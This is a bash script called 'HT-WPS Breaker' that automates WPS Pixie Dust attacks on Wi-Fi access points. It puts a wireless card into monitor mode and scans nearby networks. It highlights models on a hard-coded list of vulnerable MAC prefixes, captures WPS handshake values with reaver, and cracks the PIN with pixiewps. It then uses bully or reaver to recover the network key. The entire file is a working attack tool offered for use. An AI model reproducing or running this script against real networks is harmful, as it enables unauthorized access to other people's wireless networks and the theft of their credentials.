#!/bin/bash

# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

exit_function() {
rm -rf capture empty.txt Reaver.txt .airmon-ng.txt Ver_Pixiewps.txt Ver_Reaver.txt
echo ""
echo ""
echo ""
echo -e "$Red [!]$White Remove any temporary file."
sleep 1
echo ""
echo -e "$White [+]$Green Greetz to : ${Cyan}AKAS${White} - ${Cyan}X-MISS${White} - ${Cyan}fantome195${White} & ${Cyan}Hackshow."
echo ""
exit
}
arguments() {
						   echo "" > empty.txt
                           reaver -i $mon -b $BSSID -c $CHANNEL -vv -s empty.txt > Reaver.txt &
						   ReaverID=$!
   						   e=`cat Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p`
                           r=`cat Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p`
                           s=`cat Reaver.txt | grep E-Hash1: | cut -d' ' -f3 | sed -n 1p`
                           z=`cat Reaver.txt | grep E-Hash2: | cut -d' ' -f3 | sed -n 1p`
                           a=`cat Reaver.txt | grep AuthKey: | cut -d' ' -f3 | sed -n 1p`
                           n=`cat Reaver.txt | grep E-Nonce: | cut -d' ' -f3 | sed -n 1p`
                           m=`cat Reaver.txt | grep R-Nonce: | cut -d' ' -f3 | sed -n 1p`
                           WPS=`cat Reaver.txt | grep 'WPS PIN'`
						   echo ""
						   echo -e "$Yellow+------------------------------+"
						   echo -e "|$Red [+]$Yellow all required arguments   |"
						   echo -e "+------------------------------+"
						   echo ""
						   v=0
						   while [ $v == 0 ] #Reaver
						   do
						   n=`cat Reaver.txt | grep 'Trying pin'`
						   p=`cat Reaver.txt | wc -l`
						             if [ "$n" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
										       t=`cat Reaver.txt | sed -n $p'p' | cut -c 4-`
                           		               echo -ne "$White [+]$Green$t"
											   v=1
										   else
										       t=`cat Reaver.txt | sed -n $p'p' | cut -c 4-`
											   echo -ne "\r$White [+]$Red $t"
											   v=0
									 fi
						   done
						   echo ""
						   v=0
						   while [ $v == 0 ] #E-Nonce
						   do
						   n=`cat Reaver.txt | grep E-Nonce: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$n" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] E-Nonce: ${Green}$n"
											   v=1
										   else
											   echo -ne "\r$White [+] E-Nonce:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   echo ""
						   sleep 0.2
						   v=0
						   while [ $v == 0 ] #PKE
						   do
						   e=`cat Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p` 
						             if [ "$e" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] PKE: ${Green}$e"
											   v=1
										   else
											   echo -ne "\r$White [+] PKE:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   echo ""
						   sleep 0.2
						   v=0
						   while [ $v == 0 ] #R-Nonce
						   do
						   m=`cat Reaver.txt | grep R-Nonce: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$m" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] R-Nonce: ${Green}$m"
											   v=1
										   else
											   echo -ne "\r$White [+] R-Nonce:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   echo ""
						   sleep 0.2
						   v=0
						   while [ $v == 0 ] #PKR
						   do
						   r=`cat Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$r" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] PKR: ${Green}$r"
											   v=1
										   else
											   echo -ne "\r$White [+] PKR:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   echo ""
						   sleep 0.2
						   v=0
						   while [ $v == 0 ] #AuthKey
						   do
						   a=`cat Reaver.txt | grep AuthKey: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$a" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] AuthKey: ${Green}$a"
											   v=1
										   else
											   echo -ne "\r$White [+] AuthKey:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   echo ""
						   sleep 0.2
						   v=0
						   while [ $v == 0 ] #E-Hash1
						   do
						   s=`cat Reaver.txt | grep E-Hash1: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$s" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] E-Hash1: ${Green}$s"
											   v=1
										   else
											   echo -ne "\r$White [+] E-Hash1:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   echo ""
						   sleep 0.2
						   v=0
						   while [ $v == 0 ] #E-Hash2
						   do
						   z=`cat Reaver.txt | grep E-Hash2: | cut -d' ' -f3 | sed -n 1p`
						             if [ "$z" != "" ]
									       then
										       echo ""
										       echo -en "\033[1A\033[2K"
                           		               echo -ne "$White [+] E-Hash2: ${Green}$z"
											   v=1
										   else
											   echo -ne "\r$White [+] E-Hash2:$Red Waiting for packet"
											   v=0
									 fi
						   done
						   sleep 0.2
						   echo ""
						   echo ""
						   echo -e $Yellow"+-------------------------------------------+"
						   echo -e "|$Red [+]$Yellow Information about Access Point (AP)   |"
						   echo -e "+-------------------------------------------+"
						   echo ""
						   echo -e "$White [+] ESSID: $Green$ESSID"
				           sleep 0.2
                           echo -e "$White [+] BSSID: $Green$BSSID "
						   sleep 0.2
                           echo -e "$White [+] Channel: $Green$CHANNEL "
						   sleep 0.2
						   echo -e "$White [+] Encryption:$Green $PRIVACY"
						   sleep 0.2
						   echo -e "$White [+] Speed:$Green$SPEED"
						   Manufacturer=`cat Reaver.txt | grep Manufacturer: | cut -d' ' -f2- | sed  -n 1p`
						   Model_Name=`cat Reaver.txt | grep Name: | cut -d' ' -f2- | sed -n 1p`
						   Model_Number=`cat Reaver.txt | grep 'Model Number:' | cut -d' ' -f2- | sed -n 1p`
						   Serial_Number=`cat Reaver.txt | grep 'Serial Number:' | cut -d' ' -f2- | sed -n 1p`
						   echo -e "$White [+] $Manufacturer"
						   sleep 0.2
						   echo -e "$White [+] $Model_Name"
						   sleep 0.2
						   echo -e "$White [+] $Model_Number"
						   sleep 0.2
						   echo -e "$White [+] $Serial_Number"
						   sleep 0.2
                           echo ""
						   sleep 0.2
						   disown $ReaverID
						   kill -9 $ReaverID
}
Ver_Mon_WCar_Fun() {
                 echo ""
				 echo "[+] Scanning for wireless devices ..."
                 if [ $VerCar -ge 1 ] && [ "$VerMon" = "" ]
                      then
                           Num_Line=`iwconfig 2>&1 | grep '802.11' | wc -l `
						   echo -e "[+] We found$Green $Num_Line$White wireless device(s)."
						   echo ""
						   echo -e $Yellow"    +--------------------------------------+"
						   echo -e "    |   ${BRed}Interface     ${Yellow}|$Cyan     Chipset        ${Yellow}|"
						   echo -e "    +--------------------------------------+"
						   for (( c=1; c<=$Num_Line; c++))
       						    do
								  m[$c]=`iwconfig 2>&1 | grep '802.11' | awk '{print $1}' | sed -n ${c}'p'`
	     						  Print_Mod=`cat .airmon-ng.txt | grep ${m[$c]} | cut -f1-3`
	     						  echo -e "    $Green[$c]$White $Print_Mod"
						   done
						   echo ""
						   echo ""
						   while [ "$V_number" != "1" ]
								 do
								   echo -en "\033[1A\033[2K"
						           echo -e -n "${White}[+] Select$BRed number$White of wireless device to put into$Green monitor mode$White [${Green}1-$Num_Line$White]:$Green"
						           read number
						           wlan=${m[$number]}
								   if [ $number -ge 1 ] && [ $number -le $Num_Line ]; then
									    V_number=1
						   		   else
									    V_number=0
								   fi
						   done
						   echo -e "$White[+] Enabling monitor mode on $Green $wlan $White..."
                           airmon-ng start $wlan > /dev/null
                 elif [ $VerCar -le 0 ]
                        then   
						    echo "" 
                            sleep 0.5
                            echo -n -e $BWhite" [!]"
                            echo -e $BRed" Wireless Card Not Found"
                            echo ""
                            sleep 0.5
                 fi
				 airmon-ng > .airmon-ng.txt
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
}
Ver_Mon_Fun() {
                           cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
						   if [ $cou_mon -eq 1 ]
						        then
								    mon=`iwconfig 2>&1 | grep Mode:Monitor | awk '{print $1}'`
									Num_Mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
						   elif [ $cou_mon -gt 1 ]
						        then
						            Num_Mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
								    echo -e "[+] We found$Green $cou_mon$White monitor mode."
									echo ""
									echo -e $Yellow"    +--------------------------------------+"
						            echo -e "    |   ${BRed}Interface     ${Yellow}|$Cyan     Chipset        ${Yellow}|"
						            echo -e "    +--------------------------------------+"
						            for (( c=1; c<=$Num_Mon; c++))
       						            do
										    m[$c]=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}' | sed -n ${c}'p'`
	     						            Print_Mod=`cat .airmon-ng.txt | grep ${m[$c]} | cut -f1-3`
	     						            echo -e "    $Green[$c]$White $Print_Mod"
						            done
									echo ""
									echo ""
									while [ "$V_number" != "1" ]
									        do
											  echo -en "\033[1A\033[2K"
						                      echo -e -n "\r${White}[+] select$Red number$White of interface to use for capturing [${Green}1-$Num_Mon$White]:$Green"
						                      read number
						                      mon=${m[$number]}
											  if [ $number -ge 1 ] && [ $number -le $Num_Mon ]; then
											       V_number=1
											  else
											       V_number=0
											  fi
								    done
						   fi
						   rm -rf .airmon-ng.txt
}
Vun_MAC[0]="C4:39:3A"
Vun_MAC[1]="62:6B:D3"
Vun_MAC[2]="62:53:D4"
Vun_MAC[3]="62:CB:A8"
Vun_MAC[4]="6A:23:3D"
Vun_MAC[5]="72:23:3D"
Vun_MAC[6]="72:3D:FF"
Vun_MAC[7]="72:55:9C"
Vun_MAC[8]="0C:96:BF"
Vun_MAC[9]="08:7A:4C"
Vun_MAC[10]="20:08:ED"
Vun_MAC[11]="D0:7A:B5"
Vun_MAC[12]="E8:CD:2D"
Vun_MAC[13]="00:A0:26"
Vun_MAC[14]="C8:D3:A3"
Vun_MAC[15]="B2:46:FC"
Vun_MAC[16]="5C:35:3B"
Vun_MAC[17]="DC:53:7C"
Vun_MAC[18]="6C:B0:CE"
Vun_MAC[19]="92:EF:68"
Vun_MAC[20]="18:17:25"
Vun_MAC[21]="A6:B9:EE"
Vun_MAC[22]="00:18:E7"
Vun_MAC[23]="A6:AB:AA"
Vun_MAC[24]="D8:FE:E3"
Vun_MAC[25]="60:E7:01"
Vun_MAC[26]="A6:63:D8"
Vun_MAC[27]="A6:E2:F8"
Vun_MAC[28]="A6:EB:BA"
Vun_MAC[30]="A6:20:88"
Vun_MAC[31]="84:C9:B2"
Vun_MAC[32]="A6:B2:6C"
Vun_MAC[33]="00:11:6B"
Vun_MAC[34]="CE:70:9C"
Vun_MAC[35]="14:B9:68"
Vun_MAC[36]="A6:0C:C3"
Vun_MAC[37]="28:28:5D"
Vun_MAC[38]="A6:3E:CF"
Vun_MAC[39]="A6:44:11"
Vun_MAC[40]="78:54:2E"
re='Y'
while [ "$re" == 'Y' ] || [ "$re" == 'y' ] || [ "$re" == 'Yes' ] || [ "$re" == 'YES' ] || [ "$re" == 'yes' ] || [ "$re" == 'O' ] || [ "$re" == 'o' ] || [ "$re" == 'Oui' ] || [ "$re" == 'OUI' ] || [ "$re" == 'oui' ]
do
re=nothing
clear
trap - SIGINT SIGQUIT SIGTSTP
echo ""
sleep 0.1
echo -e $Cyan   "    +${Yellow}-------------------------------------------------------------------${Cyan}+"
sleep 0.1
echo -e $Yellow   "    |                                                                   |"
sleep 0.1
echo -e "     |$Red   ██╗  ██╗████████╗   ${Green}██╗    ██╗██████╗ ███████╗ ${BCyan}██${Yellow}╗${BCyan} ██${Yellow}╗ ${Purple}██████╗ $Yellow |"
sleep 0.1    
echo -e "     |$Red   ██║  ██║╚══██╔══╝   ${Green}██║    ██║██╔══██╗██╔════╝${Red}████████${Yellow}╗${Purple}██╔══██╗$Yellow |"   
sleep 0.1
echo -e "     |$BRed   ███████║   ██║${White}█████╗${BGreen}██║ █╗ ██║██████╔╝███████╗${Yellow}╚${BCyan}██${Yellow}╔═${BCyan}██${Yellow}╔╝${BPurple}██████╔╝$Yellow |"  
sleep 0.1 
echo -e "     |$BRed   ██╔══██║   ██║${White}╚════╝${BGreen}██║███╗██║██╔═══╝ ╚════██${Yellow}║${Red}████████${Yellow}╗${BPurple}██╔══██╗$Yellow |" 
sleep 0.1
echo -e "     |$Red   ██║  ██║   ██║      ${Green}╚███╔███╔╝██║     ███████║${Yellow}╚${BCyan}██${Yellow}╔═${BCyan}██${Yellow}╔╝${Purple}██████╔╝$Yellow |" 
sleep 0.1
echo -e "     |$Red   ╚═╝  ╚═╝   ╚═╝      ${Green} ╚══╝╚══╝ ╚═╝     ╚══════╝${Yellow} ╚═╝ ╚═╝ ${Purple}╚═════╝ $Yellow |"  
sleep 0.1
echo -e "     |                                                                   |"
sleep 0.1
echo -e $Cyan   "    +${Yellow}-------------------------------------------------------------------${Cyan}+${Yellow}"
sleep 0.1
echo -e "                          |${BRed} High${BYellow} Touch${BPurple} WPS${BGreen} Breaker${Yellow} |"
sleep 0.1
echo -e "                          ${Cyan}+${Yellow}------------------------${Cyan}+"
sleep 0.1
echo ""
echo -e "  $Yellow[1]$Cyan Attack automatically."
echo -e "  $Yellow[2]$Cyan Manuel input."
echo -e "  $Yellow[3]$Cyan If you want to crack an acces point's key with$BRed WPS PIN."
echo -e "  $Yellow[4]$Cyan Exit."
echo ""
echo -e -n "$White     [+] Select$BRed one$White thing from the menu : "
read menu
case $menu in
             "1")
		 reaver 2&> Ver_Reaver.txt
                 pixiewps 2&> Ver_Pixiewps.txt
				 airmon-ng > .airmon-ng.txt
				 Ver_Reaver=`cat Ver_Reaver.txt | grep 'Reaver v1.5.2'`
                 Ver_Pixiewps=`cat Ver_Pixiewps.txt | grep 'Pixiewps 1.1'`
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
				 Uname=`uname -m`
				 rm -rf  Ver_Reaver.txt Ver_Pixiewps.txt
				 echo ""
				 hash dpkg 2> /dev/null
				 hash_dpkg="$?"
				 if [ $hash_dpkg -eq 0 ]
				      then
					      Ver_libpcap_dev=`dpkg -l | grep libpcap0.8-dev`
				          Ver_libsqlite3_dev=`dpkg -l | grep libsqlite3-dev`
				          if [ "$Ver_libpcap_dev" = "" ]
				               then
					                echo ""
					                echo -e "$Red [!]$White Libpcap-dev not found ..."
						            sleep 3
						            echo -e "$White [+] Please wait until the$Green Libpcap-dev$White install ..."
						            echo ""
						            sleep 2
						            if [ $Uname == 'i686' ]
		                   	             then
						                     cd Tools/32bits
						                     dpkg -i libpcap0.8-dev_1.3.0-1_i386.deb
                                             dpkg -i libpcap-dev_1.3.0-1_all.deb
						                     cd ../..
						                 else
						        	         cd Tools/64bits
						                     dpkg -i libpcap0.8-dev_1.3.0-1_amd64.deb
                                             dpkg -i libpcap-dev_1.3.0-1_all.deb
						                     cd ../..
							         fi
			              fi
				          if [ "$Ver_libsqlite3_dev" = "" ]
				               then
					                echo ""
					                echo -e "$Red [!]$White Libsqlite3-dev not found ..."
						            sleep 3
						            echo -e "$White [+] Please wait until the$Green Libsqlite3-dev$White install ..."
						            sleep 2
						            if [ $Uname == 'i686' ]
		                   	             then
								             cd Tools/32bits
						                     dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_i386.deb
						                     cd ../..
								         else
								             cd Tools/64bits
									         dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_amd64.deb
									         cd ../..
				                    fi
				          fi
				 fi
				 if [ "$Ver_Pixiewps" = "" ]
				      then
					       echo ""
						   echo -e "$Red [!]$White Pixiewps not found ..."
						   sleep 3
						   echo -e "$White [+] Please wait until the$Green Pixiewps$White install ..."
						   sleep 2
						   cd Tools
					       unzip pixiewps-master.zip
						   cd pixiewps-master/src
						   make
						   make install
						   cd ../..
						   rm -rf pixiewps-master
						   cd ..
				fi
				if [ "$Ver_Reaver" = "" ]
				      then
					       echo ""
						   echo -e "$Red [!]$White Reaver not found ..."
						   sleep 3
						   echo -e "$White [+] Please wait until the$Green Reaver $White install ..."
						   sleep 2
						   cd Tools
					       unzip reaver-wps-fork-t6x-master.zip
						   cd reaver-wps-fork-t6x-master/src
						   chmod +x configure
						   ./configure
						   make
						   make install
						   cd ../..
						   rm -rf reaver-wps-fork-t6x-master
						   cd ..
				fi
				 Ver_Mon_WCar_Fun
                 if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
						   for ((c=0; c<=3; c++))
						         do
						           echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck"
								   sleep 1
						   done
						   Ver_Dir=`ls | grep -E '^capture$'`
						   if [ "$Ver_Dir" != "" ];then
	      			            rm -rf capture
								mkdir capture
						   else
						        mkdir capture
     					   fi
						   airodump-ng -w capture/capture -a $mon
						   Line_CSV=`wc -l capture/capture-01.csv | awk '{print $1}'`
						   HeTa=`cat capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
						   HeTa=`expr $HeTa - 1`
						   head -n $HeTa capture/capture-01.csv &> capture/capture-02.csv
						   tail -n +$HeTa capture/capture-01.csv &> capture/clients.csv
						   back=0
						   trap exit_function SIGINT
						   while [ "$back" == "0" ]
						   do
						     clear
							 echo -e "$Red+---------------------------------------------------------------------------------+"
						     echo -e "| [+]$White If the BSSID in$BGreen green$White this mean that device is vulnerable.$Red                  |"
							 echo -e "| [+]$White If the BSSID in$BYellow yellow$White this mean that device is may be vulnerable or aren't.$Red|"
							 echo -e "+---------------------------------------------------------------------------------+$White"
						     echo -e $BWhite" Ord	BSSID            	 CH	SEC     PWR     CLIENT   ESSID"
						     echo -e $Purple" ~~~    ~~~~~                    ~~     ~~~     ~~~     ~~~~~~   ~~~~~"
						     i=0
						     while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
								 do
								   v=0
								   length=${#MAC}
		                           PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		                           PRIVACY=${PRIVACY:0:4}
		                           if [ $length -ge 17 ]; then
			                            i=$(($i+1))
										if [ $i != 0 ]; then
										     d=1
										else
										     d=0
									    fi
			                            POWER=`expr $POWER + 100`
			                            CLIENT=`cat capture/clients.csv | grep $MAC`
										Ver_vun=`echo $MAC | cut -c 1-8`
			                          	if [ "$CLIENT" != "" ]; then
				                             CLIENT="Yes"
										else
								             CLIENT="No"
			                            fi
			                            echo -e -n " $Yellow["$i"]\t"
										for (( c=0; c<=40; c++))
										    do
											  if [ "$Ver_vun" == "${Vun_MAC[$c]}" ]
											       then
												       v=1
											  fi
									    done
										if [ "$v" == 1 ]
										    then
											    echo -e -n $BGreen"$MAC\t"
									        else
								    		    echo -e -n $BYellow"$MAC\t"
										fi
										echo -e -n $BWhite"$CHANNEL\t"
										echo -e -n $BWhite"$PRIVACY\t"
										if [ $POWER -ge 40 ]
										     then
										         echo -e -n $Green"$POWER%\t"
										elif [ $POWER -ge 30 ]
										     then
											     echo -e -n $Yellow"$POWER%\t"
										else
										         echo -e -n $Red"$POWER%\t"
										fi
										if [ "$CLIENT" == "Yes" ]
										     then
										         echo -e -n $Green"$CLIENT\t"
										     else
											     echo -e -n $Red"$CLIENT\t"
										fi
										echo -e $BWhite"$ESSID\t"
			                            IDLENGTH=$IDLENGTH
			                            ESSID[$i]=$ESSID
			                            CHANNEL[$i]=$CHANNEL
			                            BSSID[$i]=$MAC
			                            PRIVACY[$i]=$PRIVACY
			                            SPEED[$i]=$SPEED
		                                fi
								 done < capture/capture-02.csv
						   echo ""
						   echo ""
						   V_number=0
						   while [ "$V_number" != "1" ]
									        do
											  echo -en "\033[1A\033[2K"
						                      echo -n -e "${White}  [+]$Blue Select$Red one$Blue number from$White [${Green}${d}-${i}$White] : "
						                      read  N_OB
											  if [ $N_OB -ge $d ] && [ $N_OB -le $i ]; then
											       V_number=1
											  else
											       V_number=0
											  fi
						   done
						   echo ""
						   idlenght=${IDLENGTH[$N_OB]}
						   ESSID=${ESSID[$N_OB]}
						   CHANNEL=$(echo ${CHANNEL[$N_OB]}|tr -d [:space:])
						   BSSID=${BSSID[$N_OB]}
						   PRIVACY=${PRIVACY[$N_OB]}
						   SPEED=${SPEED[$N_OB]}
						   Ver_Dir=`ls | grep PIN`
						   if [ "$Ver_Dir" == "" ];then
								mkdir PIN
						   fi
						   Ver_p=`ls PIN | grep ${BSSID}`
						   if [ "$Ver_p" != "" ]
								then
									Ver_T=`cat PIN/$BSSID* | grep -e 'WPS pin' | wc -l`
								else
								    Ver_T=0
						   fi
						   if [ "$Ver_p" != "" ] && [ $Ver_T -gt 0 ]
								then
									echo ""
									echo -e " [+]$BGreen $BSSID$White is already cracked : "
                                    cat PIN/${BSSID}.txt | head -n 11 | tail -n 9
									v=0
								else
                                    echo ""
         						    echo -e "$Red[!]$White Wait until$Green the required arguments$White are captured:"
						            echo ""
						            sleep 1
						            arguments
						            rm -rf Reaver.txt empty.txt
									v=1
						   fi
                           if [ "$WPS" == "" ] && [ $v -eq 1 ]
                                then
									 if [ "$e" != "" ] && [ "$r" != "" ] && [ "$s" != "" ] && [ "$z" != "" ] && [ "$a" != "" ] && [ "$n" != "" ] && [ "$m" != "" ]
									      then
                                              echo -e "$White [+]$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
                                              sleep 0.5
                                              if [ "$Ver_T" == "0" ]; then				  
                                                  pixiewps -v 3 -f -e $e -r $r -s $s -z $z -a $a -n $n -m $m -b $BSSID | tee PIN/${BSSID}.txt | head -n 11 | tail -n 9
									              PIN=`less PIN/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
									              if [ "$PIN" != "" ]
									                   then
													        hash bully 2> /dev/null
															hash_bully="$?"
															if [ $hash_bully -eq 0 ]
															     then
										                             echo ""
										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
											                         echo ""
										                             bully -b $BSSID -c $CHANNEL -B -F -p $PIN $mon
											                         echo -e "$Yellow [+]$Green Congratulation (^_^) "
													                 echo ""
																 else
																     echo ""
																	 echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
																	 echo ""
																	 reaver -i $mon -b $BSSID -c $CHANNEL -vv -p $PIN
																	 echo -e "$Yellow[+]$Green Congratulation (^_^) "
													                 echo ""
															fi
									               else
												       cat ${BSSID}.txt | head -n 7 | tail -n 5
									                   echo ""
										               echo -e "$Red [!]$White Sorry pin not found,good luck next time."
												       echo ""
												       cd PIN;
													   rm -rf ${BSSID}.txt
												       cd ..
									               fi
											  fi
									      else
										      echo -e "$Red [!]$Yellow Not all required arguments have been supplied!"
											  echo ""
									  fi
                           fi
						   echo ""
						   echo ""
						   echo -e "$Yellow       [0]$BWhite Back to list of wireless networks."
						   echo -e "$Yellow       [1]$BWhite Back to main menu."
						   echo -e "$Yellow       [2]$BRed exit."
						   echo ""
						   echo ""
						   back="3"
						   while [ "$back" != "0" ] && [ "$back" != "1" ] && [ "$back" != "2" ] && [ "$back" != "\n" ]
						        do
								  echo -en "\033[1A\033[2K"
						          echo -e -n "$White            [+] Select$BRed one$White thing from the menu :"
						          read back
						   done
						   done
						   if [ "$back" == "1" ]
						        then
								    re=yes
						   elif [ "$back" == "2" ]
						        then
								    re=no
						   fi
						   rm -rf airmon-ng pixiewps.txt
						   rm -rf capture
                 fi
                 ;;
			"2")
			    airmon-ng > .airmon-ng.txt
                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                  VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
                  Ver_Mon_WCar_Fun
                  if [ "$VerMon" != "" ]
                       then
                           Ver_Mon_Fun
						   clear
						   echo ""
						   echo -e "$White   [+]$Green Fill in all the blanks :"
                           echo ""						   
					       echo -e -n "$Cyan         [+]$Yellow BSSID : $White"
						   read BSSID
						   echo ""
						   echo -e -n "$Cyan         [+]$Yellow CH (Channel) : $White"
						   read CHANNEL
						   echo ""
						   for ((c=0; c<=3; c++))
						         do
						           echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when you capture$Green the required arguments$White,GooD LucK"
								   sleep 1
						   done
						   reaver -i $mon -b $BSSID -c $CHANNEL -vv
						   echo ""						   
					       echo -e -n "$Cyan [+]$Yellow PKE : $Green"
						   read PKE
						   echo -e -n "$Cyan [+]$Yellow PKR : $Green"
						   read PKR
						   echo -e -n "$Cyan [+]$Yellow E-Hash1 : $Green"
						   read E_Hash1
						   echo -e -n "$Cyan [+]$Yellow E-Hash2 : $Green"
						   read E_Hash2
						   echo -e -n "$Cyan [+]$Yellow AuthKey : $Green"
						   read AuthKey
						   echo -e -n "$Cyan [+]$Yellow E-Nonce : $Green"
						   read E_Nonce
                           echo -e -n "$Cyan [+]$Yellow R-Nonce : $Green"
						   read R_Nonce
						   if [ "$PKE" != "" ] && [ "$PKR" != "" ] && [ "$E_Hash1" != "" ] && [ "$E_Hash2" != "" ] && [ "$AuthKey" != "" ] && [ "$E_Nonce" != "" ] && [ "$R_Nonce" != "" ]
									      then
                                              echo -e "$White [+]$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
											  pixiewps -v 3 -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee PIN/${BSSID}.txt | head -n 11 | tail -n 9
									          PIN=`less PIN/${BSSID}.txt | grep 'WPS pin:'`
											     if [ "$PIN" != "" ]
									                   then
													        echo""
                                                            echo -e -n "$Cyan         [+]$Yellow PIN : $White"
                                                            read PIN
													        hash bully 2> /dev/null
						                                    hash_bully="$?"
						   						            if [ $hash_bully -eq 0 ]
														        then
															        echo ""
															        echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
															        echo ""
															        bully -b $BSSID -c $CHANNEL -B -F -p $PIN $mon
															        echo -e "$Yellow [+]$Green Congratulation (^_^) "
															        echo ""
														        else
															        echo ""
															        echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
															        echo ""
															        reaver -i $mon -b $BSSID -c $CHANNEL -vv -n -p $PIN
															        echo -e "$Yellow [+]$Green Congratulation (^_^) "
															        echo ""
													        fi
									              else
												       cat ${BSSID}.txt | head -n 7 | tail -n 5
									                   echo ""
										               echo -e "$Red [!]$White Sorry pin not found,good luck next time."
												       echo ""
												       cd PIN;
													   rm -rf ${BSSID}.txt
												       cd ..
									               fi
						                 else
										      echo -e "$Red [!]$Yellow Not all required arguments have been supplied!"
											  echo ""
				            fi
				    fi
				    ;;			
			"3")
				  airmon-ng > .airmon-ng.txt
                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                  VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
                  Ver_Mon_WCar_Fun
                  if [ "$VerMon" != "" ]
                       then
                           Ver_Mon_Fun
						   clear
						   echo ""
						   echo -e "$White   [+]$Green Fill in all the blanks :"
						   echo""
                           echo -e -n "$Cyan         [+]$Yellow PIN : $White"
                           read PIN
                           echo ""						   
					       echo -e -n "$Cyan         [+]$Yellow BSSID : $White"
						   read BSSID
						   echo ""
						   echo -e -n "$Cyan         [+]$Yellow CH (Channel) : $White"
						   read CHANNEL
						   echo ""
						   hash bully
						   hash_bully="$?"
						   if [ $hash_bully -eq 0 ]
								then
									echo ""
									echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
									echo ""
									bully -b $BSSID -c $CHANNEL -B -F -p $PIN $mon
									echo -e "$Yellow [+]$Green Congratulation (^_^) "
									echo ""
								else
									echo ""
									echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
									echo ""
									reaver -i $mon -b $BSSID -c $CHANNEL -vv -p $PIN
									echo -e "$Yellow [+]$Green Congratulation (^_^) "
									echo ""
							fi
						   
				fi
				;;
			  "4")
			      exit
			      ;;
			  *)
			   echo ""
			   echo -e "$BRed     [!]$BWhite Input out of range."
			   echo ""
			   ;;
esac
echo ""
echo -e "$White [${Green}ok${White}]$Green HT-WPS Breaker$White By$BYellow Silent Ghost X."
echo ""
if [ "$re" != "yes" ]
	 then
         echo -e "             ${Green}########################################################"
         sleep 0.1
         echo -e "             ##                ${Yellow}{Full Information}${Green}                  ##"
         sleep 0.1
         echo -e "             ##   ${Cyan}-Author   ${White}:      {${Yellow} Silent Ghost ${White}}                ${Green}##"
         sleep 0.1
         echo -e "             ##   ${Cyan}-Country  ${White}:      {${Red} Morocco ${White}}                     ${Green}##"
         sleep 0.1
         echo -e "             ##   ${Cyan}-Email    ${White}:      {${Purple} silent-ghostx@hotmail.com ${White}}   ${Green}##"
         sleep 0.1
         echo -e "             ########################################################"
         sleep 0.1
         echo ""
         echo -e "$White [+]$Green Greetz to ${White}: ${Cyan}AKAS${White} - ${Cyan}X-MISS${White} - ${Cyan}fantome195${White} & ${Cyan}Hackshow."
         echo ""
fi
